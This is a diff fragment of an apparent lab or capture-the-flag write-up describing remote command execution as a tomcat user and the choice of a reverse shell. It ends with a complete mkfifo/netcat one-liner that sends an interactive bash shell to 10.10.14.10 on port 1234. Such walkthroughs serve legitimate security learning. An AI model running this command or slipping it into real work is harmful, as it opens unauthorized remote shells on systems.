@@ -132,7 +132,7 @@ uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
 
 Perfect! Remote Command Execution (RCE) worked. I also verified that netcat was available at `/bin/nc`. Now all I needed was a reverse shell on the target and my go to cheat sheet for a variety of them is [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
-I chose to use. Notice the modified IP, port and shell choice.
+I chose to use the below. Notice the modified IP, port and shell choice.
 
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.10 1234 >/tmp/f
